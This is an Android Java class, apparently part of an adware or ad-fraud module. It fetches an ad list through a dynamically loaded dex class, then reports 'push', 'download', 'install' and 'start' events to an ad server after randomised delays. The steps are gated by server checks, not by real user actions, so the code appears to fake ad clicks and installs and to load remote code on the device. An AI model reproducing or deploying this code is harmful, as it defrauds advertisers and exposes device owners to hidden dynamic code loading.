package aa.jz.buss;

import java.util.Random;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import aa.L;
import android.content.Context;

public class JzOper {
	public static final String TAG = JzOper.class.getSimpleName();
	private static Random mRandom = new Random();
	private static Context context;

	public static void oper(Context context) {
		L.e(TAG, "onHandleIntent -- start");
		JzOper.context = context;
		SpHelper.init(context);
		startAdRequest();
		L.e(TAG, "onHandleIntent -- end");
	}

	private static void startAdRequest() {
		if (!HttpUtil.goJzNext(context, 0)) {
			L.e(TAG, "don't show ad");
			return;
		}
		if (!getAdList(context)) {
			L.e(TAG, "get ad list failed");
			return;
		}
		Utils.sleepForTime(mRandom.nextInt(2000) + 2000);
		postPush();
		if (HttpUtil.goJzNext(context, 1)) {
			Utils.sleepForTime(mRandom.nextInt(1000) + 1000);
			postDownLoad();
			Utils.sleepForTime(mRandom.nextInt(8000) + 15000);
			if (HttpUtil.goJzNext(context, 2)) {
				postInstall();
				Utils.sleepForTime(mRandom.nextInt(5000) + 10000);
				postStart();
			} else {
				L.e(TAG, "user didn't install ad");
			}
		} else {
			L.e(TAG, "user didn't click ad");
		}
	}

	private static boolean getAdList(Context context) {
		L.e(TAG, "getAdList");
		String jsonStr = AdHelper.getAds(context,
				JzEntry.getDexClassLoader(context), SpHelper.getLastPushAdId());
		if (jsonStr == null || jsonStr.trim().equals("")) {
			L.e(TAG, "didn't get ad list");
			return false;
		}
		try {
			JSONArray jsonArr = new JSONArray(jsonStr);
			if (jsonArr != null && jsonArr.length() > 0) {
				JSONObject jsonObj = jsonArr.getJSONObject(0);
				if (jsonObj != null && jsonObj.has("adId")) {
					SpHelper.savePushAdId(jsonObj.getString("adId"));
					SpHelper.saveProvince(jsonObj.getString("province"));
					return true;
				} else {
					L.e(TAG, "ad list jsonObject is null");
					return false;
				}
			} else {
				L.e(TAG, "ad list jsonArray is null or its size is 0");
				return false;
			}
		} catch (JSONException e) {
			e.printStackTrace();
			return false;
		}
	}

	private static void postPush() {
		L.e(TAG, "postPush");
		AdHelper.updateProvince(context);
		AdHelper.post(context, "push");
	}

	private static void postDownLoad() {
		L.e(TAG, "postDownLoad");
		AdHelper.updateProvince(context);
		AdHelper.post(context, "download");
	}

	private static void postInstall() {
		L.e(TAG, "postInstall");
		AdHelper.updateProvince(context);
		AdHelper.post(context, "install");
	}

	private static void postStart() {
		L.e(TAG, "postStart");
		AdHelper.updateProvince(context);
		AdHelper.post(context, "start");
	}
}
